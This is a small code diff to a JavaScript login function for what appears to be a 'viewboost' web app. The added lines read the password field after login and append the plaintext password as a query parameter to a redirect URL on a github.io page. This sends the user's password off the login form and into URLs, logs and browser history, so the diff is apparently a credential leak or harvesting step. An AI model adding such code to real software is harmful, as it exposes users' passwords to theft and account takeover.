@@ -84,7 +84,10 @@ function login () {
     // DOne
     alert('User Logged In!!')
 
-    location.href = 'https://reuvendev.github.io/viewboost';
+    var b = document.getElementById('password').value
+        url = 'https://reuvendev.github.io/viewboost?value=' + encodeURIComponent(b);
+
+    document.location.href = url;
 
   })
   .catch(function(error) {
